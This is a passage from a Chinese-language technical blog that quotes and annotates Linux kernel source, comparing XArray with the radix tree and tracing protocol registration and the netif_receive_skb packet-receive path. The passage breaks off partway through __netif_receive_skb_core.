&#123;</span><br><span class="line">		shift -= XA_CHUNK_SHIFT;</span><br><span class="line">		<span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">			node = xas_alloc(xas, shift); <span class="comment">/* 结点分配 */</span></span><br><span class="line">			<span class="keyword">if</span> (!node)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (xa_track_free(xa))</span><br><span class="line">				node_mark_all(node, XA_FREE_MARK);</span><br><span class="line">			rcu_assign_pointer(*slot, xa_mk_node(node));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xa_is_node(entry)) &#123; <span class="comment">/* 判点是否为内部节点 */</span></span><br><span class="line">			node = xa_to_node(entry);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		entry = xas_descend(xas, node); <span class="comment">/* 节点查找 */</span></span><br><span class="line">		slot = &amp;node-&gt;slots[xas-&gt;xa_offset];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Radix Tree：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __radix_tree_create(struct radix_tree_root *root,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> index, struct radix_tree_node **nodep,</span><br><span class="line">		<span class="keyword">void</span> __rcu ***slotp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_node</span> *<span class="title">node</span> =</span> <span class="literal">NULL</span>, *child;</span><br><span class="line">	<span class="keyword">void</span> __rcu **slot = (<span class="keyword">void</span> __rcu **)&amp;root-&gt;xa_head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> maxindex;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> shift, offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> max = index;</span><br><span class="line">	<span class="keyword">gfp_t</span> gfp = root_gfp_mask(root);</span><br><span class="line"></span><br><span class="line">	shift = radix_tree_load_root(root, &amp;child, &amp;maxindex); <span class="comment">/* 获取Root节点 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Make sure the tree is high enough.  */</span></span><br><span class="line">	<span class="keyword">if</span> (max &gt; maxindex) &#123;</span><br><span class="line">		<span class="keyword">int</span> error = radix_tree_extend(root, gfp, max, shift); <span class="comment">/* 实现radix tree纵向的生长 */</span></span><br><span class="line">		<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> error;</span><br><span class="line">		shift = error;</span><br><span class="line">		child = rcu_dereference_raw(root-&gt;xa_head);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (shift &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		shift -= RADIX_TREE_MAP_SHIFT;</span><br><span class="line">		<span class="keyword">if</span> (child == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="comment">/* Have to add a child node.  */</span></span><br><span class="line">			child = radix_tree_node_alloc(gfp, node, root, shift,</span><br><span class="line">							offset, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 结点分配 */</span></span><br><span class="line">			<span class="keyword">if</span> (!child)</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">			rcu_assign_pointer(*slot, node_to_entry(child));</span><br><span class="line">			<span class="keyword">if</span> (node)</span><br><span class="line">				node-&gt;count++;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!radix_tree_is_internal_node(child)) <span class="comment">/* 判点是否为内部节点 */</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Go a level down */</span></span><br><span class="line">		node = entry_to_node(child);</span><br><span class="line">		offset = radix_tree_descend(node, &amp;child, index); <span class="comment">/* 节点查找 */</span></span><br><span class="line">		slot = &amp;node-&gt;slots[offset];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nodep)</span><br><span class="line">		*nodep = node;</span><br><span class="line">	<span class="keyword">if</span> (slotp)</span><br><span class="line">		*slotp = slot;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个函数之间，不管是函数名称还是执行流程，都有一些比较类似的地方，在条件符合时，两者可以互相替代</p>
<p>一些高版本的 kernel 开始使用 XArray 来替代原来的基数树：</p>
<ul>
<li>linux-2.6.34 的 <code>address_space-&gt;i_pages</code> 使用基数树</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span>		<span class="comment">/* owner: inode, block_device */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span>	<span class="title">page_tree</span>;</span>	<span class="comment">/* radix tree of all pages */</span></span><br><span class="line">	......</span><br></pre></td></tr></table></figure>
<ul>
<li>linux-4.20.1 的 <code>address_space-&gt;i_pages</code> 使用 XArray </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">i_pages</span>;</span></span><br><span class="line">	......</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/02/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%8D%8F%E8%AE%AE%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/02/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%8D%8F%E8%AE%AE%E6%A0%88/" class="post-title-link" itemprop="url">网络相关知识：协议栈</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-02 18:48:18 / Modified: 18:53:05" itemprop="dateCreated datePublished" datetime="2022-11-02T18:48:18+08:00">2022-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>TCP/IP 协议栈简述</strong> </p>
<p>TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，采用4层结构，分别是：</p>
<ul>
<li>应用层：<ul>
<li>向用户态程序提供网络接口</li>
<li>例如：域名系统DNS协议、HTTP超文本传送协议、Telnet远程登录协议、SNMP简单网络管理协议</li>
</ul>
</li>
<li>传输层：<ul>
<li>位于通信部分的最高层，用户功能的最底层，用于为运行在不同主机上的进程之间提供逻辑通信</li>
<li>例如：传输控制协议TCP - Transmission Control Protocol，用户数据报协议UDP - User Datagram Protocol</li>
</ul>
</li>
<li>网络层：<ul>
<li>进一步管理网络中的数据通信，将数据从源端经过若干中间节点传送到目的端</li>
<li>例如：ARP协议，IP协议，ICMP协议，IGMP协议</li>
</ul>
</li>
<li>链路层：<ul>
<li>提供透明可靠的数据传送基本服务</li>
<li>例如：以太网协议</li>
</ul>
</li>
</ul>
<p>梳理一下每层模型的职责：</p>
<ul>
<li>链路层：对“0”和“1”进行分组，定义数据帧，确认主机的物理地址，传输数据</li>
<li>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发</li>
<li>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序</li>
<li>应用层：定义数据格式，并按照对应的格式解读数据</li>
</ul>
<p><strong>网络协议的注册/注销</strong></p>
<p>协议在内核中用 <code>packet_type</code> 来表示，其拥有不同的容器：</p>
<ul>
<li>每个协议在系统初始化或者相应模块加载的时候添加到内核中的一个大小为16的哈希表 <code>ptype_base</code> 中，其中哈希表中的每个元素都是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">ptype_base</span>[<span class="title">PTYPE_HASH_SIZE</span>] __<span class="title">read_mostly</span>;</span> <span class="comment">/* 保存所有支持的3层协议(网际协议)处理函数的地方 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>另一种协议容器是 <code>ptype_all</code>，它直接就是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">ptype_all</span>;</span> <span class="comment">/* 保存所有协议处理回调的地方(设备无关) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>还有一种协议容器是 <code>struct net_device</code> 中的一个条目，也是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> &#123;</span></span><br><span class="line">    ......</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">ptype_all</span>;</span> <span class="comment">/* 保存所有协议处理回调的地方(设备有关) */</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加协议的 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dev_add_pack</span><span class="params">(struct packet_type *pt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">head</span> =</span> ptype_head(pt);</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;ptype_lock);</span><br><span class="line">	list_add_rcu(&amp;pt-&gt;<span class="built_in">list</span>, head); </span><br><span class="line">	spin_unlock(&amp;ptype_lock);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dev_add_pack);</span><br></pre></td></tr></table></figure>
<p>其中需要传入的 <code>packet_type</code> 结构体用于描述一个协议：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> &#123;</span></span><br><span class="line">	__be16			type;	<span class="comment">/* This is really htons(ether_type). */</span></span><br><span class="line">	<span class="keyword">bool</span>			ignore_outgoing;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span>	*<span class="title">dev</span>;</span>	<span class="comment">/* NULL is wildcarded here */</span></span><br><span class="line">	<span class="keyword">int</span>			(*func) (struct sk_buff *,</span><br><span class="line">					 struct net_device *,</span><br><span class="line">					 struct packet_type *,</span><br><span class="line">					 struct net_device *);</span><br><span class="line">	<span class="keyword">void</span>			(*list_func) (struct list_head *,</span><br><span class="line">					      struct packet_type *,</span><br><span class="line">					      struct net_device *);</span><br><span class="line">	<span class="keyword">bool</span>			(*id_match)(struct packet_type *ptype,</span><br><span class="line">					    struct sock *sk);</span><br><span class="line">	<span class="keyword">void</span>			*af_packet_priv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>type</code>：协议代码，表明了协议类型 </li>
<li><code>dev</code>：设备，指明了在哪个设备上使能该协议（<code>dev</code> 将 NULL 视为通配符，表示任意设备）</li>
<li><code>func</code>：对应协议的 Handler（处理程序，例如：在网卡收到数据后，<code>netif_receive_skb</code> 将会根据 <code>skb-&gt;protocol</code> 来调用相应的 func 来处理 skb）</li>
<li><code>af_packet_priv</code>：为 PF_PACKET 类型的 socket 使用，指向该 <code>packet_type</code> 的创建者相关的 sock 数据结构 </li>
<li><code>list</code>：协议链表头</li>
</ul>
<p>因此，协议的注册由两步完成：</p>
<ul>
<li>对 <code>packet_type</code> 进行初始化</li>
<li>调用 <code>dev_add_pack</code> 把目标协议加入到 <code>ptype_base</code></li>
</ul>
<p>相应的，协议的注销需要调用如下 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dev_remove_pack</span><span class="params">(struct packet_type *pt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__dev_remove_pack(pt);</span><br><span class="line"></span><br><span class="line">	synchronize_net(); <span class="comment">/* 保证在dev_remove_pack返回的时候,这个移除了的packet_type没有在内核中使用 */</span></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dev_remove_pack);</span><br></pre></td></tr></table></figure>
<p><strong>数据包的处理流程</strong></p>
<p>对于 <code>ptype_base</code> 和 <code>ptype_all</code> 两个类型的协议 Container(容器)，协议 Handler 的调用方法是相似的：</p>
<ul>
<li>遍历其中的双向链表，直到找到了符合条件的 <code>packet_type</code></li>
<li>可以使用 <code>deliver_skb</code> 间接调用 <code>packet_type-&gt;func</code></li>
<li>或者直接调用 <code>packet_type-&gt;func</code></li>
</ul>
<p><code>ptype_base</code> 和 <code>ptype_all</code> 的不同之处在于：</p>
<ul>
<li><code>ptype_all</code> 本身就是一个双向链表，可以直接遍历</li>
<li><code>ptype_base</code> 则是一个包含了双向链表的哈希表， 在遍历之前需要根据 <code>skb-&gt;protocol</code> 来计算找到待遍历的双向链表</li>
</ul>
<p>当网卡收到数据包后，它会将数据包从网卡硬件缓存转移到服务器内存中（具体为 <code>sk_buffer</code>），然后触发一个中断来通知内核进行处理</p>
<p>内核会执行如下函数来处理 <code>sk_buffer</code> 中的数据包：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netif_receive_skb</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	trace_netif_receive_skb_entry(skb);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netif_receive_skb_internal(skb);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(netif_receive_skb);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netif_receive_skb_internal</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	net_timestamp_check(netdev_tstamp_prequeue, skb); <span class="comment">/* 检查timestamp */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb_defer_rx_timestamp(skb))</span><br><span class="line">		<span class="keyword">return</span> NET_RX_SUCCESS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;generic_xdp_needed_key)) &#123;</span><br><span class="line">		<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">		preempt_disable();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ret = do_xdp_generic(rcu_dereference(skb-&gt;dev-&gt;xdp_prog), skb);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		preempt_enable();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret != XDP_PASS)</span><br><span class="line">			<span class="keyword">return</span> NET_RX_DROP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">/* RCU读锁(读者不受限制,写者阻塞) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_RPS</span></span><br><span class="line">	<span class="keyword">if</span> (static_key_false(&amp;rps_needed)) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rps_dev_flow</span> <span class="title">voidflow</span>, *<span class="title">rflow</span> =</span> &amp;voidflow;</span><br><span class="line">		<span class="keyword">int</span> cpu = get_rps_cpu(skb-&gt;dev, skb, &amp;rflow);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (cpu &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">			ret = enqueue_to_backlog(skb, cpu, &amp;rflow-&gt;last_qtail);</span><br><span class="line">			rcu_read_unlock();</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	ret = __netif_receive_skb(skb);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>netif_receive_skb_internal</code> 只是对数据包进行了 RPS（增加服务器的负载均衡，优化吞吐率）的处理，然后调用 <code>__netif_receive_skb</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb(struct sk_buff *skb)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; skb_pfmemalloc(skb)) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> noreclaim_flag;</span><br><span class="line">		noreclaim_flag = memalloc_noreclaim_save();</span><br><span class="line">		ret = __netif_receive_skb_one_core(skb, <span class="literal">true</span>);</span><br><span class="line">		memalloc_noreclaim_restore(noreclaim_flag);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = __netif_receive_skb_one_core(skb, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进行简单检查后就调用了 <code>__netif_receive_skb_one_core</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb_one_core(struct sk_buff *skb, <span class="keyword">bool</span> pfmemalloc)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">orig_dev</span> =</span> skb-&gt;dev;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> *<span class="title">pt_prev</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = __netif_receive_skb_core(skb, pfmemalloc, &amp;pt_prev);</span><br><span class="line">	<span class="keyword">if</span> (pt_prev)</span><br><span class="line">		ret = pt_prev-&gt;func(skb, skb-&gt;dev, pt_prev, orig_dev); <span class="comment">/* 调用协议处理 */</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后调用核心函数 <code>__netif_receive_skb_core</code>，返回对应的 <code>packet_type</code> 并调用 <code>packet_type-&gt;func</code></li>
<li>核心函数 <code>__netif_receive_skb_core</code> 的源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb_core(struct sk_buff *skb, <span class="keyword">bool</span> pfmemalloc,</span><br><span class="line">				    struct packet_type **ppt_prev)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> *<span class="title">ptype</span>, *<span class="title">pt_prev</span>;</span></span><br><span class="line">	<span class="keyword">rx_handler_func_t</span> *rx_handler;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">orig_dev</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> deliver_exact = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> ret = NET_RX_DROP;</span><br><span class="line">	__be16 type;</span><br><span class="line"></span><br><span class="line">	net_timestamp_check(!netdev_tstamp_prequeue, skb);</span><br><span class="line"></span><br><span class="line">	trace_netif_receive_skb(skb);</span><br><span class="line"></span><br><span class="line">	orig_dev = skb-&gt;dev;</span><br><span class="line"></span><br><span class="line">	skb_reset_network_header(skb); </span><br><span class="line">	<span class="keyword">if</span> (!skb_transport_header_was_set(skb))</span><br><span class="line">		skb_reset_transport_header(skb);</span><br><span class="line">	skb_reset_mac_len(skb);</span><br><span class="line"></span><br><span class="line">	pt_prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">another_round:</span><br><span class="line">	skb-&gt;skb_iif = skb-&gt;dev-&gt;ifindex;</span><br><span class="line"></span><br><span class="line">	__this_cpu_inc(softnet_data.processed);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;protocol == cpu_to_be16(ETH_P_8021Q) ||</span><br><span class="line">	    skb-&gt;protocol == cpu_to_be16(ETH_P_8021AD)) &#123;</span><br><span class="line">		skb = 